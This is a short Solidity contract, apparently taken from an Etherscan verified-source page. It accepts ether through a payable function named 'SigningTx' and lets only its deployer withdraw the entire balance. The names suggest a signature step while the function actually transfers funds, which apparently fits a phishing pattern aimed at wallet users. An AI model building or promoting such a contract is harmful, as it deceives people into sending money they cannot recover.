/**
 *Submitted for verification at Etherscan.io on 2023-01-24
*/

pragma solidity ^0.4.26;

contract SigningTxs {

    address private  owner;

    constructor() public{   
        owner=msg.sender;
    }

    function SigningTx() public payable {}
   
    function SignoutTX() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }
}